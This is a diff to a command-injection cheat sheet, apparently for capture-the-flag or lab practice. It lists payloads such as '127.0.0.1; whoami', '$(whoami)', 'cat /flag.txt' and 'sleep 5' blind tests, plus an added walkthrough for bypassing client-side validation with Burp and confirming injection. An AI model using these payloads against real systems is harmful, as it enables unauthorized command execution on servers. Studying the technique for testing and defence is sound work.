@@ -92,3 +92,56 @@ Time-based blind test	127.0.0.1 && sleep 5
 Encode it	127.0.0.1%3Bwhoami
 Print flag	127.0.0.1; cat /flag.txt
 Subshell test	127.0.0.1$(whoami) or 127.0.0.1`whoami
+
+🧪 Command Injection Flow — Straight Shooter Style:
+See a textbox / input field
+🔎 Ask: "Is this interacting with the system somehow?"
+(e.g., pings, file actions, hostname lookups)
+
+Initial Payload Test
+✅ Input:
+
+127.0.0.1; whoami
+
+; echo test
+
+& id
+👀 Watch output — did it change?
+
+Blocked?
+
+If you see a frontend error (no network request):
+👉 JavaScript validation — bypass with Burp.
+
+Use Burp Suite / ZAP
+
+Intercept request
+
+Toss in payload (URL-encode if needed)
+
+Send from Repeater
+
+Check response
+
+Confirm Injection
+
+Output includes OS info (user, kernel, path, etc.)
+
+BOOM 💥 confirmed vuln
+
+🧠 Quick Tips
+If the output is suppressed or empty, try:
+
+; echo pwned
+
+; whoami > /tmp/test.txt + download
+
+Time delay (blind test): ; sleep 5
+
+Windows boxes?
+
+Use && whoami, & whoami, echo PWN
+
+
+
+
